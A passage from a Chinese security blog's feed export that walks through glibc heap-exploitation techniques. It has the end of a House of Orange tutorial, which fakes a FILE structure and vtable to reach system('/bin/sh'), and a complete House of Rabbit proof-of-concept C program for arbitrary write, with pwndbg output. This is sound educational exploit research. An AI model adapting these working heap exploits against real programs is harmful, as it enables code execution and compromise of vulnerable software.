class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">malloc p2前</span><br><span class="line"></span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">          0x400000           0x401000 r-xp     1000 0      /home/kabeo/Desktop/how2heap/glibc_2.25/house_of_orange1</span><br><span class="line">          0x601000           0x602000 r--p     1000 1000   /home/kabeo/Desktop/how2heap/glibc_2.25/house_of_orange1</span><br><span class="line">          0x602000           0x603000 rw-p     1000 2000   /home/kabeo/Desktop/how2heap/glibc_2.25/house_of_orange1</span><br><span class="line">          0x603000           0x624000 rw-p    21000 0      [heap]  &lt;========= 0x603000-0x624000</span><br><span class="line">    0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dd1000     0x7ffff7dd3000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dd3000     0x7ffff7dd7000 rw-p     4000 0      </span><br><span class="line">    0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7fdd000     0x7ffff7fe0000 rw-p     3000 0      </span><br><span class="line">    0x7ffff7ff7000     0x7ffff7ffa000 r--p     3000 0      [vvar]</span><br><span class="line">    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]</span><br><span class="line">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 25000  /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 26000  /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      </span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">malloc p2后</span><br><span class="line"></span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">          0x400000           0x401000 r-xp     1000 0      /home/kabeo/Desktop/how2heap/glibc_2.25/house_of_orange1</span><br><span class="line">          0x601000           0x602000 r--p     1000 1000   /home/kabeo/Desktop/how2heap/glibc_2.25/house_of_orange1</span><br><span class="line">          0x602000           0x603000 rw-p     1000 2000   /home/kabeo/Desktop/how2heap/glibc_2.25/house_of_orange1</span><br><span class="line">          0x603000           0x646000 rw-p    43000 0      [heap]  &lt;========= 0x603000-0x646000</span><br><span class="line">    0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dd1000     0x7ffff7dd3000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dd3000     0x7ffff7dd7000 rw-p     4000 0      </span><br><span class="line">    0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7fdd000     0x7ffff7fe0000 rw-p     3000 0      </span><br><span class="line">    0x7ffff7ff7000     0x7ffff7ffa000 r--p     3000 0      [vvar]</span><br><span class="line">    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]</span><br><span class="line">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 25000  /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 26000  /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      </span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]</span><br></pre></td></tr></table></figure><h4 id="3-构造-IO-list-all指针"><a href="#3-构造-IO-list-all指针" class="headerlink" title="3 构造_IO_list_all指针"></a>3 构造_IO_list_all指针</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">io_list_all = top[<span class="number">2</span>] + <span class="number">0x9a8</span>;</span><br><span class="line"></span><br><span class="line">top[<span class="number">3</span>] = io_list_all - <span class="number">0x10</span>;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/10xg 0x603400</span><br><span class="line">0x603400:0x00000000000000000x0000000000000be1</span><br><span class="line">0x603410:0x00007ffff7dd1b780x00007ffff7dd2510   fd   bk</span><br><span class="line">0x603420:0x00000000000000000x0000000000000000</span><br><span class="line">0x603430:0x00000000000000000x0000000000000000</span><br><span class="line">0x603440:0x00000000000000000x0000000000000000</span><br><span class="line"></span><br><span class="line">pwndbg&gt; unsortedbin </span><br><span class="line">unsortedbin</span><br><span class="line">all [corrupted]</span><br><span class="line">FD: 0x603400 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x603400</span><br><span class="line">BK: 0x603400 —▸ 0x7ffff7dd2510 ◂— 0x0</span><br></pre></td></tr></table></figure><h4 id="4构造system-bin-sh-，缩小top-chunk"><a href="#4构造system-bin-sh-，缩小top-chunk" class="headerlink" title="4构造system(/bin/sh)，缩小top chunk"></a>4构造system(/bin/sh)，缩小top chunk</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>( ( <span class="keyword">char</span> *) top, <span class="string">"/bin/sh\x00"</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">top[<span class="number">1</span>] = <span class="number">0x61</span>;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/10xg 0x603400</span><br><span class="line">0x603400:0x0068732f6e69622f0x0000000000000061</span><br><span class="line">0x603410:0x00007ffff7dd1b780x00007ffff7dd2510</span><br><span class="line">0x603420:0x00000000000000000x0000000000000000</span><br><span class="line">0x603430:0x00000000000000000x0000000000000000</span><br><span class="line">0x603440:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><h4 id="5-满足条件-fp-gt-mode-lt-0-amp-amp-fp-gt-IO-write-ptr-gt-fp-gt-IO-write-base"><a href="#5-满足条件-fp-gt-mode-lt-0-amp-amp-fp-gt-IO-write-ptr-gt-fp-gt-IO-write-base" class="headerlink" title="5 满足条件 fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base"></a>5 满足条件 fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE *fp = (_IO_FILE *) top;</span><br><span class="line"></span><br><span class="line">fp-&gt;_mode = <span class="number">0</span>; <span class="comment">// top+0xc0</span></span><br><span class="line"></span><br><span class="line">fp-&gt;_IO_write_base = (<span class="keyword">char</span> *) <span class="number">2</span>; <span class="comment">// top+0x20</span></span><br><span class="line">fp-&gt;_IO_write_ptr = (<span class="keyword">char</span> *) <span class="number">3</span>; <span class="comment">// top+0x28</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/10xg 0x00007ffff7dd2510</span><br><span class="line">0x7ffff7dd2510:0x00000000000000000x0000000000000000</span><br><span class="line">0x7ffff7dd2520 &lt;_IO_list_all&gt;:0x00007ffff7dd25400x0000000000000000</span><br><span class="line">0x7ffff7dd2530:0x00000000000000000x0000000000000000</span><br><span class="line">0x7ffff7dd2540 &lt;_IO_2_1_stderr_&gt;:0x00000000fbad28870x00007ffff7dd25c3</span><br><span class="line">0x7ffff7dd2550 &lt;_IO_2_1_stderr_+16&gt;:0x00007ffff7dd25c30x00007ffff7dd25c3</span><br></pre></td></tr></table></figure><h4 id="6-设置跳板指向可控内存"><a href="#6-设置跳板指向可控内存" class="headerlink" title="6 设置跳板指向可控内存"></a>6 设置跳板指向可控内存</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">size_t</span> *jump_table = &amp;top[<span class="number">12</span>]; <span class="comment">// 可控内存</span></span><br><span class="line">jump_table[<span class="number">3</span>] = (<span class="keyword">size_t</span>) &amp;winner;</span><br><span class="line">*(<span class="keyword">size_t</span> *) ((<span class="keyword">size_t</span>) fp + <span class="keyword">sizeof</span>(_IO_FILE)) = (<span class="keyword">size_t</span>) jump_table; <span class="comment">// top+0xd8</span></span><br></pre></td></tr></table></figure><h4 id="7-malloc触发利用链"><a href="#7-malloc触发利用链" class="headerlink" title="7 malloc触发利用链"></a>7 malloc触发利用链</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">10</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/10xg 0x00007ffff7dd1b78</span><br><span class="line">0x7ffff7dd1b78 &lt;main_arena+88&gt;:0x000055555577cc300x0000000000000000</span><br><span class="line">0x7ffff7dd1b88 &lt;main_arena+104&gt;:0x00007ffff7dd1b780x00007ffff7dd1b78</span><br><span class="line">0x7ffff7dd1b98 &lt;main_arena+120&gt;:0x00007ffff7dd1b880x00007ffff7dd1b88</span><br><span class="line">0x7ffff7dd1ba8 &lt;main_arena+136&gt;:0x00007ffff7dd1b980x00007ffff7dd1b98</span><br><span class="line">0x7ffff7dd1bb8 &lt;main_arena+152&gt;:0x00007ffff7dd1ba80x00007ffff7dd1ba8</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/01/28/6OFEXu4a1iCAsQh.png" alt="image.png"></p><h3 id="利用思路-2"><a href="#利用思路-2" class="headerlink" title="利用思路"></a>利用思路</h3><p>在<code>glibc-2.23</code>之前没有检查，可直接构造假的<code>stdout</code>，触发libc的<code>abort</code>，利用<code>abort</code>中的<code>_IO_flush_all_lockp</code>来达到控制程序流的目的。</p><p>在<code>glibc-2.23</code>之后增加了<code>_IO_vtable_check</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Perform vtable pointer validation.  If validation fails, terminate</span></span><br><span class="line"><span class="comment">   the process.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *</span></span><br><span class="line"><span class="class"><span class="title">IO_validate_vtable</span> (<span class="title">const</span> <span class="title">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *ptr = (<span class="keyword">const</span> <span class="keyword">char</span> *) vtable;</span><br><span class="line">  <span class="keyword">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要求<code>vtable</code>必须在<code>__stop___libc_IO_vtables</code>和<code>__start___libc_IO_vtables</code>之间，这就意味着不能利用任意地址来充当<code>vtable</code>。可以将<code>vtable</code>指向<code>_IO_str_jumps</code>，将<code>fp</code>的<code>0xe8</code>偏移覆盖为<code>system</code>函数，<code>fp</code>的<code>0x38</code>偏移覆盖为<code>/bin/sh</code>字符串，就能get shell。</p><p>在<code>glibc-2.27</code>以及之后的源码中，abort中没有刷新流的操作</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Send signal which possibly calls a user handler.  */</span></span><br><span class="line"><span class="keyword">if</span> (stage == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* This stage is special: we must allow repeated calls of</span></span><br><span class="line"><span class="comment"> `abort' when a user defined handler for SIGABRT is installed.</span></span><br><span class="line"><span class="comment"> This is risky since the `raise' implementation might also</span></span><br><span class="line"><span class="comment"> fail but I don't see another possibility.  */</span></span><br><span class="line">  <span class="keyword">int</span> save_stage = stage;</span><br><span class="line"></span><br><span class="line">  stage = <span class="number">0</span>;</span><br><span class="line">  __libc_lock_unlock_recursive (lock);</span><br><span class="line"></span><br><span class="line">  raise (SIGABRT);</span><br><span class="line"></span><br><span class="line">  __libc_lock_lock_recursive (lock);</span><br><span class="line">  stage = save_stage + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此不再容易利用。</p><p>From <a href="https://kabeor.github.io/House of 系列堆漏洞详解(一">https://kabeor.github.io/House of 系列堆漏洞详解(一)/</a>/) bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;House-of-系列堆漏洞详解-一&quot;&gt;&lt;a href=&quot;#House-of-系列堆漏洞详解-一&quot; class=&quot;headerlink&quot; title=&quot;House of 系列堆漏洞详解(一)&quot;&gt;&lt;/a&gt;House of 系列堆漏洞详解(一)&lt;/h1&gt;&lt;p&gt;首发于&lt;
      
    
    </summary>
    
      <category term="Pwn" scheme="https://kabeor.github.io/categories/Pwn/"/>
    
    
      <category term="Pwn" scheme="https://kabeor.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>House of 系列堆漏洞详解(二)</title>
    <link href="https://kabeor.github.io/House%20of%20%E7%B3%BB%E5%88%97%E5%A0%86%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3(%E4%BA%8C)/"/>
    <id>https://kabeor.github.io/House of 系列堆漏洞详解(二)/</id>
    <published>2020-03-05T11:22:31.037Z</published>
    <updated>2020-03-05T11:28:20.272Z</updated>
    
    <content type="html"><![CDATA[<h1 id="House-of-系列堆漏洞详解-二"><a href="#House-of-系列堆漏洞详解-二" class="headerlink" title="House of 系列堆漏洞详解(二)"></a>House of 系列堆漏洞详解(二)</h1><p>首发于<a href="https://xz.aliyun.com/t/7267" target="_blank" rel="noopener">先知社区</a></p><h2 id="House-of-Rabbit"><a href="#House-of-Rabbit" class="headerlink" title="House of Rabbit"></a>House of Rabbit</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>如果程序同时满足以下三个条件</p><ol><li>可以分配任意大小的堆块并且释放，主要包括三类fastbin大小的堆块、smallbin大小的堆块、较大的堆块（用于分配到任意地址处）</li><li>存在一块已知地址的内存空间，并可以任意写至少<strong>0x20</strong>长度的字节</li><li>存在fastbin dup、UAF等漏洞，用于劫持fastbin的fd指针。</li></ol><p>当通过malloc函数分配内存时，当超过某特定阈值时，堆块会由mmap来分配，但同时会改变该阈值。通过连续malloc然后free两次超大chunk，会扩大top chunk的size。在申请一个fast chunk和一个small chunk，保证small chunk紧邻top chunk。在可控内存处伪造两个chunk，一个大小为0x11，绕过检查，一个为0xfffffffffffffff1，保证可覆盖任意地址并设置了inuse位。再利用其他漏洞将0xfffffffffffffff1大小的fake chunk链接到fast bin链表。free触发malloc_consolidate，用于对fastbin合并，并放到unsorted bin中。再申请一个超大 chunk，0xfffffffffffffff1大小的fake chunk会链接到 largebin，最后申请任意长度的地址，使堆块地址上溢到当前堆地址的低地址位置，从而可以分配到任意地址，达到内存任意写的目的。</p><h3 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">evict_tcache</span><span class="params">(<span class="keyword">size_t</span> size)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> target[<span class="number">0x30</span>] = <span class="string">"Hello, World!"</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> gbuf[<span class="number">8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">void</span> *p, *fast, *small, *fake;</span><br><span class="line"><span class="keyword">char</span> *victim;</span><br><span class="line"></span><br><span class="line">setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//在不泄漏地址的情况下绕过堆ASLR，使覆盖位于任意地址的变量成为可能。</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"House of Rabbit Poc\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0. 关闭 0x20,0x90 chunks 的tcache (glibc version &gt;= 2.26)\n\n"</span>);</span><br><span class="line">evict_tcache(<span class="number">0x18</span>);</span><br><span class="line">evict_tcache(<span class="number">0x88</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"1. 'av-&gt;system_mem &gt; 0xa00000'\n"</span>);</span><br><span class="line">p = <span class="built_in">malloc</span>(<span class="number">0xa00000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" 在 %p 通过mmap申请0xa00000 byte大小的内存, 然后 free.\n"</span>, p);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"></span><br><span class="line">p = <span class="built_in">malloc</span>(<span class="number">0xa00000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"   在 %p 通过mmap申请0xa00000 byte大小的内存, 然后 free.\n"</span>, p);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" 'av-&gt;system_mem' 将会比 0xa00000 大.\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"2. Free fast chunk 插入 fastbins 链表\n"</span>);</span><br><span class="line">fast = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">small = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  申请 fast chunk 和 small chunk.\n"</span></span><br><span class="line"><span class="string">"  fast = %p\n"</span></span><br><span class="line"><span class="string">"  small = %p\n"</span>, fast, small);</span><br><span class="line"><span class="built_in">free</span>(fast);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Free fast chunk.\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"3. 在 .bss 构造 fake_chunk\n"</span>);</span><br><span class="line">gbuf[<span class="number">0</span>] = <span class="number">0xfffffffffffffff0</span>;</span><br><span class="line">gbuf[<span class="number">1</span>] = <span class="number">0x10</span>;</span><br><span class="line">gbuf[<span class="number">3</span>] = <span class="number">0x21</span>;</span><br><span class="line">gbuf[<span class="number">7</span>] = <span class="number">0x1</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  fake_chunk1 (size : 0x%lx) is at %p\n"</span></span><br><span class="line"><span class="string">"  fake_chunk2 (size : 0x%lx) is at %p\n\n"</span></span><br><span class="line">, gbuf[<span class="number">3</span>], &amp;gbuf[<span class="number">2</span>], gbuf[<span class="number">1</span>], &amp;gbuf[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">fake = &amp;gbuf[<span class="number">2</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"漏洞利用 (UAF，fastbins dup等)\n"</span></span><br><span class="line"><span class="string">"  *fast = %p\n"</span></span><br><span class="line">, fake);</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span>**)fast = fake;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  fastbins list : [%p, %p, %p]\n\n"</span>, fast<span class="number">-0x10</span>, fake, *(<span class="keyword">void</span> **)(fake+<span class="number">0x10</span>));</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"4. 调用 malloc_consolidate\n"</span></span><br><span class="line"><span class="string">"  Free 和top相邻的 small chunk (%p) , 将 fake_chunk1(%p) 插入 unsorted bins 链表.\n\n"</span></span><br><span class="line">, small, fake);</span><br><span class="line"><span class="built_in">free</span>(small);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"5. 将 unsorted bins 链接到合适的链表\n"</span></span><br><span class="line"><span class="string">"  将 fake_chunk1 的 size 重写为 0xa0001 来绕过 'size &lt; av-&gt;system_mem' 检查.\n"</span>);</span><br><span class="line">gbuf[<span class="number">3</span>] = <span class="number">0xa00001</span>;</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0xa00000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  申请一个超大 chunk.\n"</span></span><br><span class="line"><span class="string">"  现在, fake_chunk1 会链接到 largebin[126](max).\n"</span></span><br><span class="line"><span class="string">"  然后, 将fake_chunk1 的 size 改为 0xfffffffffffffff1.\n\n"</span>);</span><br><span class="line">gbuf[<span class="number">3</span>] = <span class="number">0xfffffffffffffff1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"6. 覆写 .data 段上的目标值\n"</span></span><br><span class="line"><span class="string">"  目标值位于 %p\n"</span></span><br><span class="line"><span class="string">"  覆写之前是 : %s\n"</span></span><br><span class="line">, &amp;target, target);</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>((<span class="keyword">void</span>*)&amp;target-(<span class="keyword">void</span>*)(gbuf+<span class="number">2</span>)<span class="number">-0x20</span>);</span><br><span class="line">victim = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  在 %p 申请 0x10 byte, 然后任意写入.\n"</span>, victim);</span><br><span class="line"><span class="built_in">strcpy</span>(victim, <span class="string">"Hacked!!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  覆写之后是  : %s\n"</span>, target);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">evict_tcache</span><span class="params">(<span class="keyword">size_t</span> size)</span></span>&#123;</span><br><span class="line"><span class="keyword">void</span> *p;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(GLIBC_VERSION) &amp;&amp; (GLIBC_VERSION &gt;= 26)</span></span><br><span class="line">p = <span class="built_in">malloc</span>(size);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span>(GLIBC_VERSION &lt; 29)</span></span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"><span class="built_in">malloc</span>(size);</span><br><span class="line"><span class="built_in">malloc</span>(size);</span><br><span class="line"></span><br><span class="line">*(<span class="keyword">void</span>**)p = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(size);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> (GLIBC_VERSION == 29)</span></span><br><span class="line"><span class="keyword">char</span> *counts = (<span class="keyword">char</span>*)(((<span class="keyword">unsigned</span> <span class="keyword">long</span>)p &amp; ~<span class="number">0xfff</span>) + <span class="number">0x10</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="keyword">uint16_t</span> *counts = (<span class="keyword">char</span>*)(((<span class="keyword">unsigned</span> <span class="keyword">long</span>)p &amp; ~<span class="number">0xfff</span>) + <span class="number">0x10</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">counts[(size + <span class="number">0x10</span> &gt;&gt; <span class="number">4</span>) - <span class="number">2</span>] = <span class="number">0xff</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/01/29/o9rImcn6AxFiatL.png" alt="image.png"></p><h3 id="分步分析"><a href="#分步分析" class="headerlink" title="分步分析"></a>分步分析</h3><h4 id="1-malloc两个堆块使av-gt-system-mem-gt-0xa00000"><a href="#1-malloc两个堆块使av-gt-system-mem-gt-0xa00000" class="headerlink" title="1  malloc两个堆块使av-&gt;system_mem &gt; 0xa00000"></a>1  malloc两个堆块使av-&gt;system_mem &gt; 0xa00000</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">p = <span class="built_in">malloc</span>(<span class="number">0xa00000</span>);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"></span><br><span class="line">p = <span class="built_in">malloc</span>(<span class="number">0xa00000</span>);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">          0x400000           0x402000 r-xp     2000 0      /home/kabeo/Desktop/house_of_rabbit</span><br><span class="line">          0x601000           0x602000 r--p     1000 1000   /home/kabeo/Desktop/house_of_rabbit</span><br><span class="line">          0x602000           0x603000 rw-p     1000 2000   /home/kabeo/Desktop/house_of_rabbit</span><br><span class="line">          0x603000          0x1024000 rw-p   a21000 0      [heap]  &lt;===== 扩大到0xa21000</span><br><span class="line">    0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dd1000     0x7ffff7dd3000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dd3000     0x7ffff7dd7000 rw-p     4000 0      </span><br><span class="line">    0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7fdd000     0x7ffff7fe0000 rw-p     3000 0      </span><br><span class="line">    0x7ffff7ff7000     0x7ffff7ffa000 r--p     3000 0      [vvar]</span><br><span class="line">    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]</span><br><span class="line">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 25000  /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 26000  /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      </span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]</span><br></pre></td></tr></table></figure><h4 id="2-Free-fast-chunk-插入-fastbins-链表"><a href="#2-Free-fast-chunk-插入-fastbins-链表" class="headerlink" title="2 Free fast chunk 插入 fastbins 链表"></a>2 Free fast chunk 插入 fastbins 链表</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fast = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">small = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(fast);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x603000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 33, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x91</span><br><span class="line">&#125;</span><br><span class="line">0x603020 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 